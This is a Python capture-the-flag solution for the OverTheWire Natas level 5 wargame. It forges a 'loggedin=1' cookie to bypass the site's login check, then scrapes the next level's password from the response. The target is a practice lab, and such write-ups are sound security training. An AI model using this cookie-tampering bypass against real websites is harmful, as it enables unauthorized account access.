'''
For this challenge you have to check and manipulate the cookies from the site.
'''
import requests
import re

username = "natas5"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

# I am doing a GET request to get the cookies from the server.
response = session.get(url, auth=(username,password))
print(response.text)
print("="*50)
# Reading my cookies and printing the information in them.
print(response.cookies)
print("="*50)

# I change what I don't like in my cookies and I am doing another GET request, this time with the new cookies attached.
myCookie = {"loggedin" : "1"} # loggedin variable is now 1 from 0.
response = session.get(url, auth=(username,password),cookies=myCookie) # GET request with cookies
code = re.findall("The password for natas\d is (.*)</div>", response.text)[0]
print("\nThe password for the next level is: " + code)
